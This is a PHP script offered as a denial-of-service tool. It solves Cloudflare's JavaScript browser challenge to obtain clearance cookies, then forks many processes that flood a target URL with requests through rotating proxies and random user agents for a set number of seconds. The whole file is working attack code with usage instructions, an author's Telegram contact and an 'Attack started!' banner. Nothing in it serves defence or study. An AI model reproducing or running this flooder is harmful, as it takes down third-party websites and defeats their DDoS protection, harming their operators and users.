<?php
error_reporting(E_ERROR);
//color class just to make it nice [not mine]
class Colors {
	private $foreground_colors = array();
	private $background_colors = array();

	public function __construct() {
		$this->foreground_colors['black'] = '0;30';
		$this->foreground_colors['dark_gray'] = '1;30';
		$this->foreground_colors['blue'] = '0;34';
		$this->foreground_colors['light_blue'] = '1;34';
		$this->foreground_colors['green'] = '0;32';
		$this->foreground_colors['light_green'] = '1;32';
		$this->foreground_colors['cyan'] = '0;36';
		$this->foreground_colors['light_cyan'] = '1;36';
		$this->foreground_colors['red'] = '0;31';
		$this->foreground_colors['light_red'] = '1;31';
		$this->foreground_colors['purple'] = '0;35';
		$this->foreground_colors['light_purple'] = '1;35';
		$this->foreground_colors['brown'] = '0;33';
		$this->foreground_colors['yellow'] = '1;33';
		$this->foreground_colors['light_gray'] = '0;37';
		$this->foreground_colors['white'] = '1;37';

		$this->background_colors['black'] = '40';
		$this->background_colors['red'] = '41';
		$this->background_colors['green'] = '42';
		$this->background_colors['yellow'] = '43';
		$this->background_colors['blue'] = '44';
		$this->background_colors['magenta'] = '45';
		$this->background_colors['cyan'] = '46';
		$this->background_colors['light_gray'] = '47';
	}

	public function getColoredString($string, $foreground_color = null, $background_color = null) {
		$colored_string = "";

		if (isset($this->foreground_colors[$foreground_color])) {
			$colored_string .= "\033[" . $this->foreground_colors[$foreground_color] . "m";
		}
		if (isset($this->background_colors[$background_color])) {
			$colored_string .= "\033[" . $this->background_colors[$background_color] . "m";
		}

		$colored_string .=  $string . "\033[0m";

		return $colored_string;
	}

	public function getForegroundColors() {
		return array_keys($this->foreground_colors);
	}

	public function getBackgroundColors() {
		return array_keys($this->background_colors);
	}
}
$colors = new Colors();


$temp_name = time() . "_" . rand(1000, 9999);
//user agents
$uas =		 ["Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
              "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
              "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
              "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
              "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
              "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0",
              "Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0",
              "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0",
              "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3",
              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
              "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0",
              "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
              "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
              "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
              "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
              "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
              "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
              "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
              "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
              "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
              "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
              "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
              "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",
              "HTC_Touch_3G Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)",
              "Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0; Nokia;N70)",
              "Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+",
              "Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+",
              "Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.115 Mobile Safari/534.11+",
              "Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+",
              "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
              "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5",
              "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
              "Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
              "Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",];

			  //cf class
class CFBypass {
    private $html;
	private $url;


	function __construct($url, $html) {
		$this->url = parse_url($url);
		$this->html = $html;
	}
	//get how many time it has to wait
	function getTimeout() {
		if(preg_match('/}, (\d+)\);/', $this->html, $matches) !== 1)
			return false;
		return $matches[1];
	}

	//solve the challenge
	function sJrs() {
		if(!$this->isok())
			return false;
		
				$query = [];
		
				if(preg_match('/name="jschl_vc" value="([^"]+)"/', $this->html, $matches) !== 1)
			return false;
		$query['jschl_vc'] = $matches[1];
		if(preg_match('/name="pass" value="([^"]+)"/', $this->html, $matches) !== 1)
			return false;
		$query['pass'] = $matches[1];
		
				$query['jschl_answer'] = $this->sJc();
		return $query['jschl_answer']
			 ? $this->url['scheme'] . '://' . $this->url['host'] . '/cdn-cgi/l/chk_jschl?' . http_build_query($query)
			 : false;
	}
	//check if the cookies are ok
	function isok() {
				return strpos($this->html, '/cdn-cgi/l/chk_jschl') !== false
			&& strpos($this->html, 'challenge-form') !== false
			&& strpos($this->html, 'jschl_vc') !== false
			&& strpos($this->html, 'jschl_answer') !== false;
	}

	function sJc() {
				if(preg_match('/{"\w+":([^}]+)};/', $this->html, $matches) !== 1)
			return false;
		$challenge = self::dJs($matches[1]);

				if(preg_match_all('/([+\-*])=([^;]+);/', $this->html, $matches, PREG_SET_ORDER) == 0)
			return false;

		foreach($matches as $match) {
						$op = $match[1];
			$number = self::dJs($match[2]);
			if(!self::mathExec($challenge, $number, $op))
				return false;
		}

				return $challenge + strlen($this->url['host']);
	}

	private static function dJs($jsInt) {
		if(preg_match('/^\+\(\(?([^);]+)\)\+\(([^);]+)\)\)$/', $jsInt, $matches) === 1) {
						return self::dJs($matches[1])*10 + self::dJs($matches[2]);
		} else {
						return substr_count($jsInt, '!![]') + substr_count($jsInt, '!+[]');
		}
	}

	private static function mathExec(&$a, $b, $op) {
				switch($op) {
			case '+': $a += $b; return true;
			case '-': $a -= $b; return true;
			case '*': $a *= $b; return true;
			case '/': $a /= $b; return true;
			case '%': $a %= $b; return true;
		}
		return false;
	} 
	



}
$host = $argv[1]; //website target
$proxy = $argv[5]; // proxy file (optional)
$cookies_c = 0;
$threads_in = $argv[2];// how many threads
$whandlers = $argv[4]; // how many cookies to generate (if proxies are set, the number of cookies will be the same of the proxies)
//max timeout for the proxy validation
$timeout = 2;
if($proxy != null){
	$proxies = explode("\n", file_get_contents($proxy));
	$whandlers = max(array_keys($proxies));
}
	echo $colors->getColoredString("Made By Andrew\nTelegram: https://t.me/Vaiiry\n", "light_red", null) . "\n";

if(!isset($argv[1]) || !isset($argv[2]) || !isset($argv[3]) || !isset($argv[4])){
	echo $colors->getColoredString("Usage: php " . $argv[0] . " [URL] [THREADS] [SECONDS] [CLIENTS_NUMBER] [PROXY_FILE]", "light_green", null) . "\n";
	echo $colors->getColoredString("Example: php " . $argv[0] . " http://blunter.xyz/ 800 60 20 proxies.txt", "light_green", null) . "\n";
	die();
}
	echo $colors->getColoredString("Warning: Using proxies the attack can be slower!", "yellow", "black") . "\n";

function Delete($path)
{
    if (is_dir($path) === true)
    {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path), RecursiveIteratorIterator::CHILD_FIRST);

        foreach ($files as $file)
        {
            if (in_array($file->getBasename(), array('.', '..')) !== true)
            {
                if ($file->isDir() === true)
                {
                    rmdir($file->getPathName());
                }

                else if (($file->isFile() === true) || ($file->isLink() === true))
                {
                    unlink($file->getPathname());
                }
            }
        }

        return rmdir($path);
    }

    else if ((is_file($path) === true) || (is_link($path) === true))
    {
        return unlink($path);
    }

    return false;
}
//get a session with given useragent proxy ready and returns the cookies
function prepare($url, $ua, $proxy, $pid){
	global $timeout;
	global $colors;
	global $argv;
	if($argv[5] != null){
		if($proxy == ""){
			return null;
		}
	}
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_USERAGENT, $ua);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
	curl_setopt($ch, CURLOPT_PROXY, $proxy);
	$result = curl_exec($ch);
	if(strpos($result, 'Checking your browser before accessing') === false && $result !== false){
		if($proxy != NULL){
			$proxy_text = " | PROXY: $proxy";
		}
		var_dump($result);
		echo $colors->getColoredString('Initializing Cookies #' .  $pid . $proxy_text .  "\n", "light_red", null) . "\n";
		preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
		$cookiess = array('nothing' => 'nada');
		return $cookiess;
	}
	
	$cf = new CFBypass($url, $result);

	if($cf->isok()) {
		if($proxy != NULL){
			$proxy_text = " | PROXY: $proxy";
		}
		echo $colors->getColoredString('Initializing Cookies #' .  $pid . $proxy_text .  "\n", "light_red", null) . "\n";
		usleep($cf->getTimeout() * 1000);
		curl_setopt($ch, CURLOPT_URL, $cf->sJrs());
		$result = curl_exec($ch);
		preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
		$cookies = array();
		foreach($matches[1] as $item) {
			parse_str($item, $cookie);
			$cookies = array_merge($cookies, $cookie);
		}
		
		
	}
	curl_close($ch);
	return $cookies;	
}




//the attack function
function attack($host=false, $threads=false, $end=false){
	global $argv;
	$end = time() + $argv[3]; 
	global $handlers;

	for($i = 0; $i < $threads; $i ++){
		$pid = pcntl_fork();
		if($pid == -1) {
			echo "Something went wrongs.\n";
			exit();
		} elseif($pid) {
			continue;
		} else {
			while($end > time()) {
				$flood = curl_init();
				$handler = $handlers[array_rand($handlers)];
				$cookies = $handler['cookies'];
				$ua = $handler['ua'];
				$cfduid = $cookies['__cfduid'];
				$clear = $cookies["cf_clearance"];
				$cstr = "__cfduid=$cfduid; cf_clearance=$clear;";
				$proxy = $handler['proxy'];
				//echo "IM USING $proxy\n";
				curl_setopt($flood, CURLOPT_URL, $host);
				curl_setopt($flood, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($flood, CURLOPT_USERAGENT, $ua);
				curl_setopt($flood, CURLOPT_FOLLOWLOCATION, true);
				curl_setopt($flood, CURLOPT_PROXY, $proxy);
				curl_setopt($flood, CURLOPT_COOKIE, $cstr);
				$var123 = curl_exec($flood);
				curl_close($flood);
			}
			die();
		}
	}
	for($j = 0; $j < $threads; $j++) {
		$pid = pcntl_wait($status);
	}
	
}

//save the handler to file to read it later bc the subprocess cant read the same variables
function writeHandler($handler){
	global $temp_name;
	if(!file_exists($temp_name)){
		mkdir($temp_name);
	}
	$json = json_encode($handler);
	$hash = md5($json);
	$fo = fopen($temp_name . "/" . $hash . ".handler", "w");
	fwrite($fo, $json);
	fclose($fo);
}
//read them
function readHandlers(){
	global $temp_name;
	if(!file_exists($temp_name)){
		return NULL;
	}
	$handlers = scandir($temp_name . "/"); 
	foreach($handlers as $handler)
	{
		if(is_file($temp_name . "/" .$handler)){
			$handlers_array[] = json_decode(file_get_contents($temp_name . "/" .$handler), true);
		}
	}
	return $handlers_array;
}
//initialize
for ($i = 1; $i <= $whandlers; ++$i) { 
	$pid = pcntl_fork(); 
	$ua = $uas[array_rand($uas)];
	if (!$pid) { 
		$cookies =  prepare($host, $ua, $proxies[$i], $i);
		if($cookies != NULL){
			$handler = array('cookies' => $cookies, 'ua' => $ua, 'proxy' => $proxies[$i]);	
			//var_dump($cookies);
			writeHandler($handler);
		}
		exit($i); 
	} 
} 
//wait all process getting ready
while (pcntl_waitpid(0, $status) != -1) { 
	$status = pcntl_wexitstatus($status); 
} 

$handlers = readHandlers();
Delete($temp_name . "/");
//var_dump($handlers);
//start the attack
echo $colors->getColoredString("Attack started!", "light_green", null) . "\n";
attack($host, $threads_in);
?>